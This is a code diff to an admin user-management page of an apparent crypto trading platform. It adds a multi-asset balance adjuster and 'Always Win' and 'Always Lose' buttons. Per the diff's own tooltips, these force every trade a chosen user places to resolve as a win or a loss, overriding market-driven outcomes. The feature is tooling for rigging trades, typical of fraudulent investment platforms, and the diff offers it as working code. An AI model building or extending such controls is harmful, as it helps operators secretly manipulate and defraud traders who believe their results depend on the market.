@@ -7,12 +7,15 @@ import {
   useAdjustAdminUserBalance,
   useCleanupDemoHoldings,
   useCleanupLegacyBalanceBase,
+  useSetUserTradingMode,
 } from '@/lib/api';
 import {
   Search, ShieldAlert, ShieldCheck, Shield, Loader2,
   X, ArrowUpRight, ArrowDownLeft, Coins, FileCheck, TrendingUp, User,
-  Ban, Snowflake, Trash2, Unlock, Wallet, Sparkles,
+  Ban, Snowflake, Trash2, Unlock, Wallet, Sparkles, Trophy, Skull,
 } from 'lucide-react';
+
+const ADJUSTABLE_ASSETS = ['USDT', 'BTC', 'ETH', 'BNB', 'SOL', 'XRP', 'GOLD'] as const;
 import {
   Dialog,
   DialogContent,
@@ -264,12 +267,14 @@ export default function Users() {
   const adjustBalance = useAdjustAdminUserBalance();
   const cleanupDemoHoldings = useCleanupDemoHoldings();
   const cleanupLegacyBalanceBase = useCleanupLegacyBalanceBase();
+  const setTradingMode = useSetUserTradingMode();
   const [search, setSearch] = useState('');
   const [selectedUserId, setSelectedUserId] = useState<string | null>(null);
   const [actionError, setActionError] = useState<string | null>(null);
   const [cleanupMessage, setCleanupMessage] = useState<string | null>(null);
   const [balanceUser, setBalanceUser] = useState<{ clerkUserId: string; displayName: string } | null>(null);
   const [balanceDirection, setBalanceDirection] = useState<'credit' | 'debit'>('credit');
+  const [balanceAsset, setBalanceAsset] = useState<typeof ADJUSTABLE_ASSETS[number]>('USDT');
   const [balanceAmount, setBalanceAmount] = useState('');
   const [balanceReason, setBalanceReason] = useState('');
   const [balanceError, setBalanceError] = useState<string | null>(null);
@@ -331,7 +336,25 @@ export default function Users() {
     setBalanceAmount('');
     setBalanceReason('');
     setBalanceDirection('credit');
+    setBalanceAsset('USDT');
     setBalanceError(null);
+  };
+
+  const handleTradingMode = (
+    event: React.MouseEvent,
+    userId: string,
+    displayName: string,
+    current: 'auto' | 'always_win' | 'always_lose',
+    target: 'always_win' | 'always_lose',
+  ) => {
+    event.stopPropagation();
+    const next = current === target ? 'auto' : target;
+    const label = next === 'auto' ? 'automatic market-driven outcomes' : next === 'always_win' ? 'ALWAYS WIN' : 'ALWAYS LOSE';
+    if (!window.confirm(`Set ${displayName}'s trades to ${label}?`)) return;
+    setActionError(null);
+    setTradingMode.mutate({ userId, mode: next }, {
+      onError: (error) => setActionError(error instanceof Error ? error.message : 'Unable to update trading mode.'),
+    });
   };
 
   const closeBalanceDialog = () => {
@@ -343,13 +366,14 @@ export default function Users() {
     event.preventDefault();
     if (!balanceUser || !balanceAmount || !balanceReason.trim()) return;
     const action = balanceDirection === 'credit' ? 'add to' : 'deduct from';
-    if (!window.confirm(`Confirm ${action} ${balanceAmount} USDT ${balanceDirection === 'credit' ? 'for' : 'from'} ${balanceUser.displayName}'s wallet balance?`)) return;
+    if (!window.confirm(`Confirm ${action} ${balanceAmount} ${balanceAsset} ${balanceDirection === 'credit' ? 'for' : 'from'} ${balanceUser.displayName}'s wallet?`)) return;
     setBalanceError(null);
     adjustBalance.mutate({
       userId: balanceUser.clerkUserId,
       direction: balanceDirection,
       amount: balanceAmount,
       reason: balanceReason.trim(),
+      asset: balanceAsset,
     }, {
       onSuccess: resetBalanceDialog,
       onError: (error) => setBalanceError(error instanceof Error ? error.message : 'Unable to adjust user balance.'),
@@ -522,10 +546,38 @@ export default function Users() {
                             setBalanceUser({ clerkUserId: user.clerkUserId, displayName: user.displayName });
                           }}
                           className="inline-flex items-center gap-1.5 rounded-md border border-primary/25 px-2.5 py-1.5 text-[11px] font-semibold text-primary transition hover:bg-primary/10 disabled:cursor-not-allowed disabled:opacity-40"
-                          title="Add or deduct USDT wallet balance"
+                          title="Add or deduct USDT or coin balance"
                         >
                           <Wallet className="h-3.5 w-3.5" />
                           Adjust Balance
+                        </button>
+                        <button
+                          type="button"
+                          disabled={user.accountStatus === 'deleted' || setTradingMode.isPending}
+                          onClick={(event) => handleTradingMode(event, user.clerkUserId, user.displayName, user.tradeOutcomeMode, 'always_win')}
+                          className={`inline-flex items-center gap-1.5 rounded-md border px-2.5 py-1.5 text-[11px] font-semibold transition disabled:cursor-not-allowed disabled:opacity-40 ${
+                            user.tradeOutcomeMode === 'always_win'
+                              ? 'border-emerald-500 bg-emerald-500/20 text-emerald-300'
+                              : 'border-emerald-500/25 text-emerald-300 hover:bg-emerald-500/10'
+                          }`}
+                          title="Force every trade this user places to resolve as WIN"
+                        >
+                          <Trophy className="h-3.5 w-3.5" />
+                          {user.tradeOutcomeMode === 'always_win' ? 'Always Win ✓' : 'Always Win'}
+                        </button>
+                        <button
+                          type="button"
+                          disabled={user.accountStatus === 'deleted' || setTradingMode.isPending}
+                          onClick={(event) => handleTradingMode(event, user.clerkUserId, user.displayName, user.tradeOutcomeMode, 'always_lose')}
+                          className={`inline-flex items-center gap-1.5 rounded-md border px-2.5 py-1.5 text-[11px] font-semibold transition disabled:cursor-not-allowed disabled:opacity-40 ${
+                            user.tradeOutcomeMode === 'always_lose'
+                              ? 'border-rose-500 bg-rose-500/20 text-rose-300'
+                              : 'border-rose-500/25 text-rose-300 hover:bg-rose-500/10'
+                          }`}
+                          title="Force every trade this user places to resolve as LOSS"
+                        >
+                          <Skull className="h-3.5 w-3.5" />
+                          {user.tradeOutcomeMode === 'always_lose' ? 'Always Lose ✓' : 'Always Lose'}
                         </button>
                       </div>
                     </td>
@@ -550,6 +602,18 @@ export default function Users() {
               Adjusting the wallet balance for <span className="font-semibold text-foreground">{balanceUser?.displayName}</span>.
               This does not change authentication, sessions, or other account operations.
             </p>
+            <label className="block text-sm font-medium">
+              Asset
+              <select
+                value={balanceAsset}
+                onChange={(event) => setBalanceAsset(event.target.value as typeof ADJUSTABLE_ASSETS[number])}
+                className="mt-2 w-full rounded-lg border border-input bg-background px-3 py-2.5 font-mono text-sm outline-none focus:border-primary"
+              >
+                {ADJUSTABLE_ASSETS.map((asset) => (
+                  <option key={asset} value={asset}>{asset}</option>
+                ))}
+              </select>
+            </label>
             <div className="grid grid-cols-2 gap-2">
               {(['credit', 'debit'] as const).map((direction) => (
                 <button
@@ -569,7 +633,7 @@ export default function Users() {
               ))}
             </div>
             <label className="block text-sm font-medium">
-              Amount (USDT)
+              Amount ({balanceAsset === 'USDT' ? 'USDT' : `${balanceAsset} quantity`})
               <input
                 type="number"
                 min="0.00000001"
@@ -595,7 +659,9 @@ export default function Users() {
               />
             </label>
             <p className="text-xs text-muted-foreground">
-              Deductions cannot exceed the user’s available USDT after active trade reservations.
+              {balanceAsset === 'USDT'
+                ? 'Deductions cannot exceed the user’s available USDT after active trade reservations.'
+                : `Deductions cannot exceed the user’s current ${balanceAsset} holding. Other assets are never affected.`}
             </p>
             {balanceError && (
               <p className="rounded-lg border border-rose-500/25 bg-rose-500/10 px-3 py-2 text-sm text-rose-300" role="alert">
